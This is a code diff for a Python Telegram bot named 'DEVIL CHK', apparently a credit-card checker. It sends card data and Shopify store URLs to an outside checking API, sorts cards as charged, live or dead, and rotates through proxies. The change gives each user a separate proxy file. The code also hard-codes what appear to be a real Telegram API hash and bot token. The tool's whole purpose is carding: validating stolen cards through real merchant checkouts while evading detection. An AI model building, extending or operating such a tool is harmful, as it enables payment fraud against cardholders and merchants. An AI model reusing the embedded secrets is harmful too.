@@ -13,11 +13,15 @@ API_ID = 39825025
 API_HASH = '47170fd9a11b3f591bbc56849519f0f8'
 BOT_TOKEN = '8827673793:AAHKJphZzbQwOKBZS2pHLTDekPvYUrsJT6Y'
 ADMIN_ID = [1707478010]
-CHECKER_API_URL = '‏https://haters.cxchk.site/shopii'
+CHECKER_API_URL = 'https://haters.cxchk.site/shopii'
 
 PREMIUM_USERS_FILE = "premium_users.txt"
 SITES_FILE = 'sites.txt'
-PROXY_FILE = 'proxy.txt'
+
+# مجلد لحفظ بروكسيات المستخدمين بشكل منفصل
+PROXY_DIR = "user_proxies"
+if not os.path.exists(PROXY_DIR):
+    os.makedirs(PROXY_DIR)
 
 bot = TelegramClient('checker_bot', API_ID, API_HASH).start(bot_token=BOT_TOKEN)
 
@@ -104,8 +108,13 @@ def load_premium_users():
 def load_sites():
     return get_file_lines(SITES_FILE)
 
-def load_proxies():
-    return get_file_lines(PROXY_FILE)
+# دالة لجلب مسار ملف البروكسي الخاص بكل مستخدم
+def get_user_proxy_file(user_id):
+    return os.path.join(PROXY_DIR, f"proxy_{user_id}.txt")
+
+# تعديل جلب البروكسي ليعتمد على الأيدي
+def load_proxies(user_id):
+    return get_file_lines(get_user_proxy_file(user_id))
 
 def is_premium(user_id):
     premium_users = load_premium_users()
@@ -180,7 +189,6 @@ def extract_cc(text):
 
 async def check_card(card, site, proxy):
     try:
-        # 1. تنظيف بيانات البطاقة من الأقواس
         clean_card = card.replace('{', '').replace('}', '').strip()
         
         parts = clean_card.split('|')
@@ -190,14 +198,12 @@ async def check_card(card, site, proxy):
         if not site.startswith('http'):
             site = f'https://{site}'
         
-        # 2. إعداد البروكسي
         proxy_str = None
         if proxy:
             proxy_parts = proxy.split(':')
             if len(proxy_parts) >= 2:
                 proxy_str = proxy 
 
-        # 3. إعداد البيانات للرابط الجديد
         params = {
             'site': site,
             'cc': clean_card
@@ -205,7 +211,6 @@ async def check_card(card, site, proxy):
         if proxy_str:
             params['proxy'] = proxy_str
             
-        # 4. الاتصال بالموقع (استخدام الرابط الجديد)
         url = "https://haters.cxchk.site/shopii"
         timeout = aiohttp.ClientTimeout(total=100)
         
@@ -216,14 +221,12 @@ async def check_card(card, site, proxy):
                 
                 raw = await resp.json(content_type=None)
 
-        # 5. تحليل الرد (المنطق الأصلي للبوت)
         response_msg = raw.get('Response', '')
         price = raw.get('Price', '-')
         if price != '-' and price != 0:
             price = f"${price}"
         gateway = raw.get('Gateway', 'Shopify')
         
-        # استخدام دالة is_site_dead الموجودة مسبقاً في ملفك
         if is_site_dead(response_msg, gateway, price):
             return {'status': 'Site Error', 'message': response_msg, 'card': card, 'retry': True, 'gateway': gateway, 'price': price}
 
@@ -336,7 +339,7 @@ async def send_final_results(user_id, results):
 
     summary = f"""<b>⚡💳 ㅤ#𝐃𝐄𝐕𝐈𝐋 𝐂𝐇𝐊  💳⚡</b>
 <b>━━━━━━━━━━━━━━━━━</b>
-<b>⚡💠 𝐑𝐞𝐬𝐮𝐥𝐭𝐬</b>
+<b>⚡💠 𝐑e𝐬𝐮𝐥𝐭𝐬</b>
 <blockquote>💳 Total: {results['total']} | ✅ Charged: {len(results['charged'])} | 🔥 Live: {len(results['approved'])} | ❌ Dead: {len(results['dead'])}</blockquote>
 <blockquote>🌐 𝐆𝐚𝐭𝐞𝐰𝐚𝐲: 🔥 {gateway}</blockquote>
 <blockquote>⏱️ Time: {hours}h {minutes}m {seconds}s</blockquote>
@@ -447,7 +450,6 @@ async def test_proxy(proxy):
 @bot.on(events.NewMessage(pattern='/start'))
 async def start(event):
     user_id = event.sender_id
-    is_prem = is_premium(user_id)
     
     welcome_text = """<b>⚡💳 Welcome to DEVIL CHK ! 💳⚡</b>
 <b>━━━━━━━━━━━━━━━━━</b>
@@ -493,7 +495,7 @@ async def admin_panel_callback(event):
     
     admin_text = """<b>⚡💳 ㅤ#𝐃𝐄𝐕𝐈𝐋 𝐂𝐇𝐊  💳⚡</b>
 <b>━━━━━━━━━━━━━━━━━</b>
-<b>⚡💠 𝐀𝐝𝐦𝐢𝐧 𝐏𝐚𝐧𝐞𝐥</b>
+<b>⚡💠 𝐀𝐝𝐦𝐢𝐧 𝐏𝐚𝐧𝐞λ</b>
 <blockquote>• /addpremium id - Add premium user
 • /removepremium id - Remove premium user
 • /listpremium - List premium users
@@ -540,13 +542,13 @@ async def single_cc_check(event):
         return
 
     sites = load_sites()
-    proxies = load_proxies()
+    proxies = load_proxies(user_id) # تعديل: تحميل بروكسي الفاحص فقط
 
     if not sites:
         await event.reply(premium_emoji("❌ No sites available. Please contact admin."), parse_mode='html')
         return
     if not proxies:
-        await event.reply(premium_emoji("❌ No proxies available. Please add proxies."), parse_mode='html')
+        await event.reply(premium_emoji("❌ No proxies available. Please add proxies via `/addproxy`."), parse_mode='html')
         return
 
     cc_input = event.message.text.split(' ', 1)[1].strip()
@@ -624,8 +626,10 @@ async def check_command(event):
     if not load_sites():
         await event.reply(premium_emoji("❌ No sites available. Please contact admin."))
         return
-    if not load_proxies():
-        await event.reply(premium_emoji("❌ No proxies available. Please add proxies to proxy.txt."))
+        
+    current_proxies = load_proxies(user_id) # تعديل: سحب بروكسيات الشخص نفسه
+    if not current_proxies:
+        await event.reply(premium_emoji("❌ No proxies available. Please add proxies to your list using `/addproxy`."))
         return
 
     status_msg = await event.reply(premium_emoji("🫆 Processing your file..."))
@@ -691,11 +695,11 @@ async def check_command(event):
                     break
                     
                 current_sites = load_sites()
-                current_proxies = load_proxies()
-                if not current_sites or not current_proxies:
+                fresh_proxies = load_proxies(user_id) # تعديل: جلب بروكسيات الفاحص داخل الووركر
+                if not current_sites or not fresh_proxies:
                     break
                 
-                res = await check_card_with_retry(card, current_sites, current_proxies, max_retries=1)
+                res = await check_card_with_retry(card, current_sites, fresh_proxies, max_retries=1)
                 
                 all_results['checked'] += 1
                 all_results['last_card'] = card
@@ -768,18 +772,19 @@ async def add_proxy_command(event):
             await event.reply(premium_emoji("❌ No proxies provided."), parse_mode='html')
             return
 
-        current_proxies = load_proxies()
+        current_proxies = load_proxies(user_id) # تعديل: جلب بروكسيات الشخص فقط
         new_proxies = [p for p in proxies_to_add if p not in current_proxies]
 
         if not new_proxies:
-            await event.reply(premium_emoji("⚠️ All provided proxies already exist in `proxy.txt`."), parse_mode='html')
+            await event.reply(premium_emoji("⚠️ All provided proxies already exist in your list."), parse_mode='html')
             return
 
-        async with aiofiles.open(PROXY_FILE, 'a') as f:
+        user_file = get_user_proxy_file(user_id)
+        async with aiofiles.open(user_file, 'a') as f: # تعديل: الكتابة في ملف الأيدي الشخصي
             for proxy in new_proxies:
                 await f.write(f"{proxy}\n")
 
-        await event.reply(premium_emoji(f"✅ <b>Proxies Added Successfully!</b>\n\nAdded {len(new_proxies)} new proxies to `proxy.txt`."), parse_mode='html')
+        await event.reply(premium_emoji(f"✅ <b>Proxies Added Successfully!</b>\n\nAdded {len(new_proxies)} new proxies to your list."), parse_mode='html')
 
     except Exception as e:
         await event.reply(premium_emoji(f"❌ Error adding proxies: {e}"), parse_mode='html')
@@ -792,9 +797,9 @@ async def proxy_command(event):
         await event.reply(premium_emoji("<b>❌ Access Denied\n\nOnly premium users can use this bot.</b>"), parse_mode='html')
         return
 
-    proxies = load_proxies()
+    proxies = load_proxies(user_id) # تعديل: جلب بروكسيات الشخص فقط
     if not proxies:
-        await event.reply(premium_emoji("❌ `proxy.txt` is empty. Nothing to check."), parse_mode='html')
+        await event.reply(premium_emoji("❌ Your proxy list is empty. Nothing to check."), parse_mode='html')
         return
 
     status_msg = await event.reply(premium_emoji(f"🔥 Checking {len(proxies)} proxies in batches of 50..."), parse_mode='html')
@@ -825,7 +830,8 @@ async def proxy_command(event):
                 parse_mode='html'
             )
 
-        async with aiofiles.open(PROXY_FILE, 'w') as f:
+        user_file = get_user_proxy_file(user_id)
+        async with aiofiles.open(user_file, 'w') as f: # تعديل: التحديث داخل ملف الشخص فقط
             for proxy in alive_proxies:
                 await f.write(f"{proxy}\n")
 
@@ -833,7 +839,7 @@ async def proxy_command(event):
         summary_msg += f"<b>Total Proxies:</b> {len(proxies)}\n"
         summary_msg += f"<b>Alive:</b> {len(alive_proxies)}\n"
         summary_msg += f"<b>Removed:</b> {len(dead_proxies)}\n\n"
-        summary_msg += "<code>proxy.txt</code> has been updated with only working proxies."
+        summary_msg += "Your proxy list has been updated with only working proxies."
 
         await status_msg.edit(premium_emoji(summary_msg), parse_mode='html')
 
@@ -879,19 +885,20 @@ async def remove_single_proxy(event):
         await event.reply(premium_emoji("❌ Usage: <code>/rmproxy ip:port:user:pass</code>"), parse_mode='html')
         return
 
-    current_proxies = load_proxies()
+    current_proxies = load_proxies(user_id) # تعديل
 
     if proxy_to_remove not in current_proxies:
-        await event.reply(premium_emoji(f"❌ Proxy not found: <code>{proxy_to_remove}</code>"), parse_mode='html')
+        await event.reply(premium_emoji(f"❌ Proxy not found in your list: <code>{proxy_to_remove}</code>"), parse_mode='html')
         return
 
     new_proxies = [p for p in current_proxies if p != proxy_to_remove]
 
-    async with aiofiles.open(PROXY_FILE, 'w') as f:
+    user_file = get_user_proxy_file(user_id)
+    async with aiofiles.open(user_file, 'w') as f: # تعديل
         for proxy in new_proxies:
             await f.write(f"{proxy}\n")
 
-    await event.reply(premium_emoji(f"✅ <b>Proxy Removed!</b>\n\n<code>{proxy_to_remove}</code>"), parse_mode='html')
+    await event.reply(premium_emoji(f"✅ <b>Proxy Removed from your list!</b>\n\n<code>{proxy_to_remove}</code>"), parse_mode='html')
 
 @bot.on(events.NewMessage(pattern='/rmproxyindex\s+'))
 async def remove_proxy_by_index(event):
@@ -912,10 +919,10 @@ async def remove_proxy_by_index(event):
         await event.reply(premium_emoji("❌ Invalid indices. Use numbers separated by commas."), parse_mode='html')
         return
 
-    current_proxies = load_proxies()
+    current_proxies = load_proxies(user_id) # تعديل
 
     if not current_proxies:
-        await event.reply(premium_emoji("❌ No proxies in proxy.txt"), parse_mode='html')
+        await event.reply(premium_emoji("❌ No proxies in your list."), parse_mode='html')
         return
 
     removed = []
@@ -930,12 +937,13 @@ async def remove_proxy_by_index(event):
         await event.reply(premium_emoji("❌ No valid indices found."), parse_mode='html')
         return
 
-    async with aiofiles.open(PROXY_FILE, 'w') as f:
+    user_file = get_user_proxy_file(user_id)
+    async with aiofiles.open(user_file, 'w') as f: # تعديل
         for proxy in new_proxies:
             await f.write(f"{proxy}\n")
 
     removed_text = "\n".join(removed[:10])
-    await event.reply(premium_emoji(f"✅ <b>Removed {len(removed)} proxies!</b>\n\nRemoved:\n<code>{removed_text}</code>"), parse_mode='html')
+    await event.reply(premium_emoji(f"✅ <b>Removed {len(removed)} proxies from your list!</b>\n\nRemoved:\n<code>{removed_text}</code>"), parse_mode='html')
 
 @bot.on(events.NewMessage(pattern='/clearproxy'))
 async def clear_all_proxies(event):
@@ -945,11 +953,11 @@ async def clear_all_proxies(event):
         await event.reply(premium_emoji("<b>❌ Access Denied\n\nOnly premium users can use this bot.</b>"), parse_mode='html')
         return
 
-    current_proxies = load_proxies()
+    current_proxies = load_proxies(user_id) # تعديل
     count = len(current_proxies)
 
     if count == 0:
-        await event.reply(premium_emoji("❌ <code>proxy.txt</code> is already empty."), parse_mode='html')
+        await event.reply(premium_emoji("❌ Your proxy list is already empty."), parse_mode='html')
         return
 
     timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
@@ -978,10 +986,11 @@ async def clear_all_proxies(event):
         await event.reply(premium_emoji(f"❌ Error creating backup: {e}"), parse_mode='html')
         return
 
-    async with aiofiles.open(PROXY_FILE, 'w') as f:
+    user_file = get_user_proxy_file(user_id)
+    async with aiofiles.open(user_file, 'w') as f: # تعديل
         await f.write("")
 
-    await event.reply(premium_emoji(f"✅ <b>Cleared all {count} proxies!</b>\n\n<code>proxy.txt</code> is now empty."), parse_mode='html')
+    await event.reply(premium_emoji(f"✅ <b>Cleared all {count} proxies from your list!</b>"), parse_mode='html')
 
 @bot.on(events.NewMessage(pattern='/getproxy'))
 async def get_all_proxies(event):
@@ -991,15 +1000,15 @@ async def get_all_proxies(event):
         await event.reply(premium_emoji("<b>❌ Access Denied\n\nOnly premium users can use this bot.</b>"), parse_mode='html')
         return
 
-    current_proxies = load_proxies()
+    current_proxies = load_proxies(user_id) # تعديل
 
     if not current_proxies:
-        await event.reply(premium_emoji("❌ No proxies in <code>proxy.txt</code>"), parse_mode='html')
+        await event.reply(premium_emoji("❌ No proxies found in your list."), parse_mode='html')
         return
 
     if len(current_proxies) <= 50:
         proxy_list = "\n".join([f"{i+1}. <code>{p}</code>" for i, p in enumerate(current_proxies)])
-        await event.reply(premium_emoji(f"<b>📋 All Proxies ({len(current_proxies)}):</b>\n\n{proxy_list}"), parse_mode='html')
+        await event.reply(premium_emoji(f"<b>📋 Your Proxies ({len(current_proxies)}):</b>\n\n{proxy_list}"), parse_mode='html')
     else:
         timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
         filename = f"proxies_{user_id}_{timestamp}.txt"
@@ -1008,7 +1017,7 @@ async def get_all_proxies(event):
             for i, proxy in enumerate(current_proxies):
                 await f.write(f"{i+1}. {proxy}\n")
 
-        await event.reply(premium_emoji(f"<b>📋 All Proxies ({len(current_proxies)}):</b>\n\nFile attached below."), file=filename, parse_mode='html')
+        await event.reply(premium_emoji(f"<b>📋 Your Proxies ({len(current_proxies)}):</b>\n\nFile attached below."), file=filename, parse_mode='html')
 
         try:
             os.remove(filename)
@@ -1028,9 +1037,9 @@ async def site_command(event):
         await event.reply(premium_emoji("❌ `sites.txt` is empty. Nothing to check."), parse_mode='html')
         return
 
-    proxies = load_proxies()
+    proxies = load_proxies(user_id) # تعديل
     if not proxies:
-        await event.reply(premium_emoji("❌ No proxies available. Please add proxies to proxy.txt."), parse_mode='html')
+        await event.reply(premium_emoji("❌ No proxies available. Please add proxies to your list first."), parse_mode='html')
         return
 
     status_msg = await event.reply(premium_emoji(f"🔥 Checking {len(sites)} sites..."), parse_mode='html')
@@ -1042,7 +1051,7 @@ async def site_command(event):
     try:
         for i in range(0, len(sites), batch_size):
             batch = sites[i:i + batch_size]
-            fresh_proxies = load_proxies()
+            fresh_proxies = load_proxies(user_id) # تعديل
             if not fresh_proxies:
                 fresh_proxies = proxies
 
@@ -1145,9 +1154,9 @@ async def addsites_command(event):
         
         await status_msg.edit(premium_emoji(f"🔥 Checking {len(sites)} sites before adding..."), parse_mode='html')
         
-        proxies = load_proxies()
+        proxies = load_proxies(user_id) # تعديل: الأدمن يستخدم البروكسيات الخاصة به للفحص هنا
         if not proxies:
-            await status_msg.edit(premium_emoji("❌ No proxies available to test sites."), parse_mode='html')
+            await status_msg.edit(premium_emoji("❌ No proxies available in your list to test sites."), parse_mode='html')
             return
         
         alive_sites = []
@@ -1285,7 +1294,7 @@ async def stats_command(event):
     
     premium_users = load_premium_users()
     sites = load_sites()
-    proxies = load_proxies()
+    proxies = load_proxies(user_id) # تعديل: يعرض عدد البروكسيات الخاصة بالأدمن نفسه
     
     stats_text = f"""<b>⚡💳 ㅤ#𝐃𝐄𝐕𝐈𝐋 𝐂𝐇𝐊  💳⚡</b>
 <b>━━━━━━━━━━━━━━━━━</b>
@@ -1293,7 +1302,7 @@ async def stats_command(event):
 <blockquote>👑 Admins: {len(ADMIN_ID)}</blockquote>
 <blockquote>💎 Premium Users: {len(premium_users)}</blockquote>
 <blockquote>🌐 Sites: {len(sites)}</blockquote>
-<blockquote>🔌 Proxies: {len(proxies)}</blockquote>
+<blockquote>🔌 Your Proxies: {len(proxies)}</blockquote>
 <b>━━━━━━━━━━━━━━━━━</b>
 🤖 <b>Bot Status:</b> Running ✅"""
     
@@ -1310,5 +1319,5 @@ async def stop_handler(event):
         await event.answer(" Stopped", alert=True)
         await event.edit(premium_emoji("😡 **Checking stopped by user.**"), parse_mode='html')
 
-print("✅ Bot started successfully!")
+print("✅ Bot started successfully with user isolated proxies!")
 bot.run_until_disconnected()
